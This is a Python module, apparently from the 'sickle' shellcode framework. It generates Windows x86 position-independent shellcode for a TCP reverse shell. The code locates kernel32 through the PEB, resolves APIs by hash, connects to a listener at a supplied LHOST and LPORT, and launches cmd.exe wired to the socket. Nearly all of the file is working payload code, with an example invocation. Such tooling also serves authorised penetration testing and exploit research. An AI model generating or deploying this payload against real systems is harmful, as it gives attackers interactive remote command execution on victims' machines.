import sys
import ctypes
import struct

from sickle.common.lib.generic.mparser import argument_check

from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.lib.programmer.instantiator import gen_offsets
from sickle.common.lib.programmer.instantiator import init_sc_args
from sickle.common.lib.programmer.instantiator import calc_stack_space

from sickle.common.lib.generic.convert import port_str_to_htons
from sickle.common.lib.generic.convert import from_str_to_xwords
from sickle.common.lib.generic.convert import ip_str_to_inet_addr
from sickle.common.lib.generic.convert import from_str_to_win_hash

from sickle.common.headers.windows.ntdef import _LIST_ENTRY
from sickle.common.headers.windows.ntdef import _UNICODE_STRING

from sickle.common.headers.windows.winnt import _IMAGE_DOS_HEADER
from sickle.common.headers.windows.winnt import _IMAGE_NT_HEADERS
from sickle.common.headers.windows.winnt import _IMAGE_EXPORT_DIRECTORY
from sickle.common.headers.windows.winnt import _IMAGE_OPTIONAL_HEADER

from sickle.common.headers.windows.winternl import _PEB
from sickle.common.headers.windows.winternl import _PEB_LDR_DATA
from sickle.common.headers.windows.winternl import _LDR_DATA_TABLE_ENTRY

from sickle.common.headers.windows.winsock2 import AF_INET
from sickle.common.headers.windows.winsock2 import sockaddr
from sickle.common.headers.windows.winsock2 import SOCK_STREAM
from sickle.common.headers.windows.winsock2 import IPPROTO_TCP

from sickle.common.headers.windows.processthreadsapi import _STARTUPINFOA
from sickle.common.headers.windows.processthreadsapi import STARTF_USESTDHANDLES

class Shellcode():

    arch = "x86"

    platform = "windows"

    name = f"Windows ({arch}) CMD Reverse Shell"

    module = f"{platform}/{arch}/shell_reverse_tcp"

    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = []

    summary = ("TCP-based reverse shell over IPv4 that provides an interactive cmd.exe "
               "session")

    description = """
    A TCP-based reverse shell over IPv4 that provides an interactive cmd.exe
    session. Since this payload is not staged, there is no need for anything
    more than a Netcat listener.
    """

    arguments = {}
    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]
        arg_object["architecture"] = Shellcode.arch
        self.builder = Assembler(Shellcode.arch)

        self.dependencies = {
            "Kernel32.dll": [
                "LoadLibraryA",
                "CreateProcessA",
                "TerminateProcess",
            ],
            "Ws2_32.dll": [
                "WSAStartup",
                "WSASocketA",
                "connect",
            ]
        }

        sc_args = init_sc_args(self.dependencies)
        sc_args.update({ 
            "wsaData"                       : 0x000,
            "name"                          : 0x010,
            "lpStartupInfo"                 : ctypes.sizeof(_STARTUPINFOA),
            "lpCommandLine"                 : len("cmd\x00"),
            "lpProcessInformation"          : 0x000,
        })

        self.stack_space = calc_stack_space(sc_args,
                                            ctypes.sizeof(ctypes.c_uint32))

        self.storage_offsets = gen_offsets(sc_args,
                                           Shellcode.arch)

        return

    def get_kernel32(self):
        """Generates stub for obtaining the base address of Kernel32.dll
        """

        stub = f"""
getKernel32:
    push ebp
    mov ebp, esp
    mov dl, 0x4b
getPEB:
    xor ebx, ebx
    xor ecx, ecx
    mov bl, 0x30
    mov edi, fs:[ebx]
    mov edi, [edi + {_PEB.Ldr.offset}]
    mov edi, [edi + {_PEB_LDR_DATA.InLoadOrderModuleList.offset}]
search:
    mov eax, [edi + {_LDR_DATA_TABLE_ENTRY.DllBase.offset}]
    mov esi, [edi + {_LDR_DATA_TABLE_ENTRY.BaseDllName.offset + _UNICODE_STRING.Buffer.offset}]    
    mov edi, [edi]
    cmp [esi + 0x18], cx
    jne search
    cmp [esi], dl
    jne search
found:
    leave
    ret
        """

        return stub

    def lookup_function(self):
        """Generates the stub responsible for obtaining the base address of a function
        """

        stub = f"""
lookupFunction:
    push ebp
    mov ebp, esp
    sub esp, 0x08
    xor ebx, ebx
    mov [ebp + 0x08], ebx       ; [EBP+0x08] will serve as a temporary register (x64 has less registers)
    mov [ebp + 0x0C], edx       ; Argv passed into lookupFunction
    mov ebx, [edi + {_IMAGE_DOS_HEADER.e_lfanew.offset}]
    add ebx, {_IMAGE_NT_HEADERS.OptionalHeader.offset + _IMAGE_OPTIONAL_HEADER.DataDirectory.offset}
    add ebx, edi
    mov eax, [ebx]
    mov ebx, edi
    add ebx, eax
    mov eax, [ebx + {_IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
    mov edx, edi
    add edx, eax
    mov ecx, [ebx + {_IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
    mov [ebp + 0x08], ebx       ; Backup EBX since we are going to XOR it
parseNames:
    jecxz error
    dec ecx
    mov eax, [edx + ecx * 4]
    mov esi, edi
    add esi, eax
    xor eax, eax
    xor ebx, ebx
    cld
calcHash:
    lodsb
    test al, al
    jz calcDone
    ror ebx, 0xD
    add ebx, eax
    jmp calcHash
calcDone:
    cmp ebx, [ebp + 0x0C]
    jnz parseNames
findAddress:
    mov ebx, [ebp + 0x08]       ; Restore EBX value prevously saved
    mov edx, [ebx + {_IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
    add edx, edi
    xor eax, eax
    mov ax, [edx + ecx * 2]
    mov edx, [ebx + {_IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
    add edx, edi
    mov eax, [edx + eax * 4]
    add eax, edi
error:
    leave
    ret
        """

        return stub

    def load_library(self, lib):
        """Generates the stub to load a library not currently loaded into a process
        """

        lists = from_str_to_xwords(lib, 0x04)
        write_index = self.storage_offsets["functionName"]

        src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))

        for i in range(len(lists["DWORD_LIST"])):
            src += "    mov ecx, 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() )
            src += "    mov [ebp+{}], ecx\n".format(hex(write_index))
            write_index += 4

        for i in range(len(lists["WORD_LIST"])):
            src += "    mov cx, 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
            src += "    mov [ebp+{}], cx\n".format(hex(write_index))
            write_index += 2

        for i in range(len(lists["BYTE_LIST"])):
            src += "    mov cl, {}\n".format( hex(lists["BYTE_LIST"][i]) )
            src += "    mov [ebp+{}], cl\n".format(hex(write_index))
            write_index += 1

        src += f"""
    lea ecx, [ebp + {self.storage_offsets['functionName']}]
    push ecx
    mov eax, [ebp + {self.storage_offsets['LoadLibraryA']}]
    call eax
        """

        return src

    def resolve_functions(self):
        """This function is responsible for loading all libraries and resolving respective functions
        """

        stub = ""
        for lib, imports in self.dependencies.items():
            if (lib != "Kernel32.dll"):
                stub += self.load_library(lib)
                stub += """
    mov edi, eax
                """

            for func in range(len(imports)):
                stub += f"""
get_{imports[func]}:
    mov edx, {from_str_to_win_hash(imports[func])}
    call lookupFunction
    mov [ebp + {self.storage_offsets[imports[func]]}], eax
                """

        return stub

    def generate_source(self):
        """Returns bytecode generated by the keystone engine.
        """

        argv_dict = argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("LPORT" not in argv_dict.keys()):
            lport = 4444
        else:
            lport = int(argv_dict["LPORT"])


        shellcode = f"""
_start:
    mov ebp, esp
    sub esp, {self.stack_space}

memsetFuncBuffer:
    xor eax, eax
    xor ecx, ecx
    lea edi, [ebp + {self.storage_offsets["functionName"]}]
    mov cl, 0x08
    rep stosd

launch:
    call getKernel32
    mov edi, eax
"""

        shellcode += self.resolve_functions()

        shellcode += f"""
; EAX => WSAStartup([in]  WORD      wVersionRequired,
;                   [out] LPWSADATA lpWSAData);
call_WSAStartup:
    mov eax, [ebp + {self.storage_offsets['WSAStartup']}]

    lea ecx, [ebp + {self.storage_offsets['wsaData']}]
    push ecx

    xor ecx, ecx
    mov cx, 0x202
    push ecx

    call eax

; EAX => WSASocketA([in] int                 af,
;                   [in] int                 type,
;                   [in] int                 protocol,
;                   [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,
;                   [in] GROUP               g,
;                   [in] DWORD               dwFlags);
call_WSASocketA:
    mov eax, [ebp + {self.storage_offsets['WSASocketA']}]
    xor ecx, ecx
    push ecx
    push ecx
    push ecx
    mov cl, {IPPROTO_TCP}
    push ecx
    mov cl, {SOCK_STREAM}
    push ecx
    mov cl, {AF_INET}
    push ecx
    call eax

    mov esi, eax ; Save the socket file descriptor (sockfd)

; EAX => connect([in] SOCKET s,
;                [in] const sockaddr *name,
;                [in] int namelen);
call_connect:
    xor ecx, ecx
    mov cl, {ctypes.sizeof(sockaddr)}
    push ecx
    mov dword ptr [ebp + {self.storage_offsets['name'] + 0x04}], {hex(ip_str_to_inet_addr(argv_dict['LHOST']))}
    mov dword ptr [ebp + {self.storage_offsets['name']}], 0x{struct.pack('<H', lport).hex()}0002
    lea ecx, [ebp + {self.storage_offsets['name']}]
    push ecx
    push esi
    mov eax, [ebp + {self.storage_offsets['connect']}]
    call eax

; [EBX] => typedef struct _STARTUPINFOA {{ }}
setup_STARTUPINFOA:
    lea ebx, [ebp + {self.storage_offsets['lpStartupInfo']}]

memsetStructBuffer:
    lea edi, [ebp + {self.storage_offsets['lpStartupInfo']}]
    xor eax, eax
    xor ecx, ecx
    mov cl, {int( ctypes.sizeof(_STARTUPINFOA) / 0x04 )}
    rep stosd

initMembers:
    mov al, {ctypes.sizeof(_STARTUPINFOA)}
    mov [ebx], eax
    mov eax, {STARTF_USESTDHANDLES}
    mov [ebx + {_STARTUPINFOA.dwFlags.offset}], eax
    mov [ebx + {_STARTUPINFOA.hStdInput.offset}], esi
    mov [ebx + {_STARTUPINFOA.hStdOutput.offset}], esi
    mov [ebx + {_STARTUPINFOA.hStdError.offset}], esi

; EAX => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,
;                       [in, out, optional] LPSTR                 lpCommandLine,
;                       [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
;                       [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
;                       [in]                BOOL                  bInheritHandles,
;                       [in]                DWORD                 dwCreationFlags,
;                       [in, optional]      LPVOID                lpEnvironment,
;                       [in, optional]      LPCSTR                lpCurrentDirectory,
;                       [in]                LPSTARTUPINFOA        lpStartupInfo,
;                       [out]               LPPROCESS_INFORMATION lpProcessInformation);
call_CreateProccessA:
    lea ecx, [ebp + {self.storage_offsets['lpProcessInformation']}]
    push ecx
    push ebx
    xor ecx, ecx
    push ecx
    push ecx
    push ecx
    inc ecx
    push ecx
    dec ecx
    push ecx
    push ecx
    lea ecx, [ebp + {self.storage_offsets['lpCommandLine']}]
    mov dword ptr [ecx], 0x646d63
    push ecx
    xor ecx, ecx
    push ecx
    mov eax, [ebp + {self.storage_offsets['CreateProcessA']}]
    call eax

; EAX => TerminateProcess([in] HANDLE hProcess,
;                         [in] UINT   uExitCode);
call_TerminateProcess:
    xor ecx, ecx
    push ecx

    dec ecx
    push ecx    

    mov eax, [ebp + {self.storage_offsets['TerminateProcess']}]
    call eax
"""

        shellcode += self.get_kernel32()
        shellcode += self.lookup_function()

        return shellcode

    def get_shellcode(self):
        """Generates Windows (x86) generic reverse shell
        """

        return self.builder.get_bytes_from_asm(self.generate_source())
